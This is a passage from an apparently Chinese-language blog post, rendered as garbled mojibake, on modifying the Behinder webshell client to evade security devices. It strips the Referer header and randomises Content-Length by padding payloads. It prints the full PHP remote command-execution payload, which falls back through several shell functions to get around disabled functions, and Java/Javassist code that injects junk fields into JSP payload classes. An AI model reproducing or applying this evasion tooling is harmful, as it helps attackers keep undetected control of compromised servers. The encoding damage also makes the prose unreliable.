src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230059005.png" alt="image-20250701230059005"></p><p>æ²¡æœ‰referer ä¹Ÿæ˜¯æ­£å¸¸ä½¿ç”¨çš„ã€‚</p><p>è¿™é‡ŒçŒœæµ‹ä½œè€…æ˜¯æƒ³é€šè¿‡referer è¿›è¡Œè¿·æƒ‘è®¾å¤‡æˆ–è€…äººï¼Œæˆ‘ä»¬è¿™é‡Œå°±å…ˆç»™ä»–å»æ‰å§ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230330965.png" alt="image-20250701230330965"></p><p>åœ¨å¾ˆå¤šç½‘ç«™ä¸Šæˆ‘ä»¬éƒ½å¯ä»¥çœ‹åˆ°æœ‰referer ï¼Œè¿™æˆ–è®¸ä¼šæˆä¸ºæ£€æµ‹çš„æ ‡å‡†ï¼Œæˆ–è€…ä¸ä¼šï¼Œæˆ‘ä»¬å°±å…ˆå»æ‰å§ï¼Œåé¢å¦‚æœæœ‰éœ€è¦ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œé‡å†™ã€‚</p><p>åˆ°æ­¤ï¼Œå¤§æ¦‚è¯·æ±‚çš„headerå°±å·®ä¸å¤šäº†ï¼Œæˆ‘çœ‹æœ‰å¤§ä½¬çš„æ–‡ç« è¯´ï¼Œæœ‰çš„Content-Lengthåœ¨5700å·¦å³</p><p>è¿™ä¸ªæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æµé‡ã€‚ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿè¿™ä¸ªæ•°å­—ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702003623065.png" alt="image-20250702003623065"></p><p>å†°èä¸­æ¯ä¸ªè¯­è¨€éƒ½å¯¹åº”äº†æ¨¡å—</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702003654124.png" alt="image-20250702003654124"></p><p>è¿™äº›æ¨¡å—å°±æ˜¯  å½“æˆ‘ä»¬æ‰“å¼€å†°èçš„é»‘æ¡†åï¼Œæˆ‘ä»¬åœ¨å‘½ä»¤æ‰§è¡Œè¿™ä¸ªé¡µé¢æ‰§è¡Œå‘½ä»¤ï¼Œå°±ä¼šè°ƒç”¨cmdæ¨¡å—çš„ä»£ç ã€‚</p><p>å½“æˆ‘ä»¬æ‰§è¡Œlsåï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004017564.png" alt="image-20250702004017564"></p><p>å…ˆä¼šå‘ä¸€ä¸ªå¤§åŒ…ï¼Œaesè§£å¼€å</p><p>éœ€è¦è§£å¼€ä¸€ä¸ªbase464ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @set_time_limit(<span class="number">0</span>);</span><br><span class="line">    @ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    @ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== strpos(strtolower(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! feof(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        exec(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = join(chr(<span class="number">10</span>), <span class="variable">$kWJW</span>) . chr(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> encrypt(json_encode(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(getSafeStr(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> encrypt(json_encode(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> @session_start();</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_encrypt(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL3d3dy93d3dyb290L3BocC9yZWJleW9uZC8gO2xz&quot;</span>;<span class="variable">$cmd</span>=base64_decode(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;L3d3dy93d3dyb290L3BocC9yZWJleW9uZC8=&quot;</span>;<span class="variable">$path</span>=base64_decode(<span class="variable">$path</span>);</span><br><span class="line">main(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>å°±ä¼šå¾—åˆ°ä¸€ä¸ªæºç é‡Œçš„æ¨¡æ¿ï¼Œå’Œæ‰§è¡Œå‘½ä»¤ä¼ çš„å‚æ•°ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004420175.png" alt="image-20250702004420175"></p><p>è¿™é‡Œcmdè§£å‡ºæ¥å°±æ˜¯ä¼ é€’çš„å‚æ•°äº†ï¼Œå› ä¸ºæ¨¡æ¿æ˜¯ç¡®å®šçš„ï¼Œé‚£ä¹ˆä»–çš„ä¼ é€’çš„å€¼å¤§å°å°±æ˜¯ç¡®å®šçš„ï¼Œè¿™é‡Œå› ä¸ºæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ä¸ä¸€æ ·ï¼Œå¯èƒ½ä¸ä¸€æ ·ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºæˆ‘ä»¬å¸¸å¸¸æ‰§è¡Œçš„å‘½ä»¤éƒ½å¾ˆçŸ­ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004840065.png" alt="image-20250702004840065"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡ŒçŸ­çš„å‘½ä»¤å°±æ˜¯5740å·¦å³ï¼Œæ‰§è¡Œé•¿çš„å°±ä¼šç›¸åº”çš„åŠ ä¸Šä¸€äº›ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œè€ƒè™‘åˆ°å¦‚æœå®‰å…¨è®¾å¤‡æ ‡è®°äº†è¿™ä¸ªé•¿åº¦ï¼Œé‚£å°±ä¸å¥½äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¨¡æ¿ä¸­åŠ ä¸€äº›å­—ç¬¦ä¸²ï¼Œè®©è¿™ä¸ªæ¨¡æ¿å˜å¤§ä¸€äº›ã€‚é¦–å…ˆåœ¨net/rebeyond/behinder/core/Params.java<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014110041-17513916703093.png" alt="image-20250702014110041"></p><p>æ‰¾åˆ°ç›¸å…³çš„ä»£ç ï¼Œå› ä¸ºæ¯æ¬¡éƒ½ä¼šåŠ è½½phpï¼Œæˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„æ¨¡æ¿ä¹Ÿcopyå‡ºæ¥ä¸€ä»½ï¼Œåœ¨net/rebeyond/behinder/core/Params.javaä¸­å†™ä¸€ä¸ªéšæœºä½æ•°çš„å­—ç¬¦ä¸²ï¼Œè·¨åº¦å¤§ä¸€äº›ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String CHAR_POOL = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">int</span> length = random.nextInt(<span class="number">51</span>) + <span class="number">150</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(CHAR_POOL.charAt(random.nextInt(CHAR_POOL.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        String randomStr = sb.toString();</span><br></pre></td></tr></table></figure><p>éšæœº150-200å­—ç¬¦ï¼Œå¤ªå¤§äº†ä¹Ÿä¸è¡Œï¼Œå½±å“ä¼ è¾“ï¼Œæ…¢ã€‚</p><p>ç„¶åå†æ¨¡æ¿ä¸­éšæ„å®šä¹‰ä¸€ä¸ªå˜é‡</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014615170.png" alt="image-20250702014615170"></p><p>ç„¶ååœ¨è¿›è¡Œæ›¿æ¢ä¸€ä¸‹ï¼Œå°±å¥½äº†ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014634806.png" alt="image-20250702014634806"></p><p>æ‰“åŒ…ç¼–è¯‘ï¼Œçœ‹ä¸‹æ•ˆæœã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702021249763.png" alt="image-20250702021249763"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå†æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ä¹Ÿå°±å¯ä»¥åŠ¨æ€çš„è°ƒæ•´å¤§å°äº†ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702021619775.png" alt="image-20250702021619775"></p><p>ç›¸åº”çš„ï¼Œæˆ‘ä»¬å†è§£è¯·æ±‚åŒ…çš„æ—¶å€™ï¼Œä¹Ÿå°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²äº†ã€‚</p><p>è¿™é‡Œç¬”è€…åªæ˜¯åŠ äº†cmd.phpå…¶ä»–çš„éƒ½æ²¡åŠ ï¼Œå› ä¸ºç¬”è€…å†æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œå…¶ä»–åŠŸèƒ½çš„è¯·æ±‚å­—ç¬¦ä¸²å¤§å°æ³¢åŠ¨æ¯”è¾ƒå¤§ï¼Œéƒ½æ²¡æœ‰å¤ªå›ºå®šå†ä¸€ä¸ªå€¼èŒƒå›´è¾¹ï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œä»æ–°copyä¸€ä»½ï¼ŒåŠ ä¸Šè¦æ›¿æ¢çš„å­—ç¬¦ä¹Ÿå°±å¯ä»¥äº†ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705230906068.png" alt="image-20250705230906068"></p><p>é¡ºä¾¿åœ¨åŠ ä¸€ä¸‹jspçš„ï¼Œ</p><p>éœ€è¦åœ¨net/rebeyond/behinder/core/Params.javaçš„</p><p><code>public static byte[] getTransProtocoledClass(String className, TransProtocol transProtocol) throws Exception &#123;</code></p><p>ä¿®æ”¹ï¼Œç”¨åˆ°classä¿®æ”¹ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getTransProtocoledClass(String className, TransProtocol transProtocol) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String transProtocolName = transProtocol.getName();</span><br><span class="line">        <span class="keyword">if</span> (transProtocol.getId() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            String key = ((LegacyCryptor)transProtocol.getCryptor()).getKey();</span><br><span class="line">            <span class="keyword">if</span> (legacyPayloadClassCache.containsKey(transProtocolName) &amp;&amp; legacyPayloadClassCache.get(transProtocolName).containsKey(key) &amp;&amp; legacyPayloadClassCache.get(transProtocolName).get(key).containsKey(className)) &#123;</span><br><span class="line">                <span class="keyword">return</span> legacyPayloadClassCache.get(transProtocolName).get(key).get(className).toBytecode();</span><br><span class="line">            &#125;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line">            CtClass PocCls = cp.getAndRename(String.format(<span class="string">&quot;net.rebeyond.behinder.payload.java.%s&quot;</span>, className), Utils.getRandomString(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//java</span></span><br><span class="line">            <span class="comment">// === æ’å…¥éšæœºå­—æ®µ ===</span></span><br><span class="line">            String chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">int</span> length = <span class="number">150</span> + random.nextInt(<span class="number">1500</span>);</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                sb.append(chars.charAt(random.nextInt(chars.length())));</span><br><span class="line">            &#125;</span><br><span class="line">            String randomValue = sb.toString();</span><br><span class="line">            String fieldName = <span class="string">&quot;bohemian_&quot;</span> + random.nextInt(<span class="number">9999</span>);</span><br><span class="line">            String fieldSrc = <span class="string">&quot;private static final String &quot;</span> + fieldName + <span class="string">&quot; = \&quot;&quot;</span> + randomValue + <span class="string">&quot;\&quot;;&quot;</span>;</span><br><span class="line">            CtField junkField = CtField.make(fieldSrc, PocCls);</span><br><span class="line">            PocCls.addField(junkField);</span><br><span class="line">            <span class="comment">//end</span></span><br><span class="line"></span><br><span class="line">            CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);</span><br><span class="line">            PocCls.removeMethod(PocCls.getDeclaredMethod(<span class="string">&quot;Encrypt&quot;</span>));</span><br><span class="line">            PocCls.addMethod(encodeMethod);</span><br><span class="line">            PocCls.setName(className);</span><br><span class="line">            PocCls.detach();</span><br><span class="line">            Map&lt;String, CtClass&gt; payloadClass = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            payloadClass.put(className, PocCls);</span><br><span class="line">            Map&lt;String, Map&lt;String, CtClass&gt;&gt; keyPayloadMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            keyPayloadMap.put(key, payloadClass);</span><br><span class="line">            legacyPayloadClassCache.put(transProtocolName, keyPayloadMap);</span><br><span class="line">            <span class="keyword">return</span> PocCls.toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (payloadClassCache.containsKey(transProtocolName) &amp;&amp; payloadClassCache.get(transProtocolName).containsKey(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> payloadClassCache.get(transProtocolName).get(className).toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line">        ClassPool cp = ClassPool.getDefault();</span><br><span class="line">        CtClass PocCls = cp.getAndRename(String.format(<span class="string">&quot;net.rebeyond.behinder.payload.java.%s&quot;</span>, className), Utils.getRandomString(<span class="number">10</span>));</span><br><span class="line">        CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);</span><br><span class="line">        PocCls.removeMethod(PocCls.getDeclaredMethod(<span class="string">&quot;Encrypt&quot;</span>));</span><br><span class="line">        PocCls.addMethod(encodeMethod);</span><br><span class="line">        PocCls.setName(className);</span><br><span class="line">        PocCls.detach();</span><br><span class="line">        HashMap&lt;String, CtClass&gt; payloadClass = <span class="keyword">new</span> HashMap&lt;String, CtClass&gt;();</span><br><span class="line">        payloadClass.put(className, PocCls);</span><br><span class="line">        payloadClassCache.put(transProtocolName, payloadClass);</span><br><span class="line">        <span class="keyword">return</span> PocCls.toBytecode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705231249340.png" alt="image-20250705231249340"></p><p>è¿™æ ·æ¯æ¬¡ç”¨çš„æ—¶å€™æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠæ•°æ®åŒ…éšæœºçš„æ‰©å¤§ä¸€äº›äº†ã€‚</p><p>Content-lengthå¤§å°çš„æ”¹å˜å°±å…ˆåˆ°è¿™é‡Œå§ã€‚</p><p>ç½‘ä¸Šè¿˜æœ‰å…¶ä»–å¤§å¸ˆå‚…çš„æ–‡ç« è¯´ï¼Œæ¯æ¬¡å®¢æˆ·ç«¯è¯·æ±‚çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯çš„ç«¯å£å·æ˜¯ä»<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702025210498.png" alt="image-20250702025210498"></p><p>49700å·¦å³å¼€å§‹åŠ 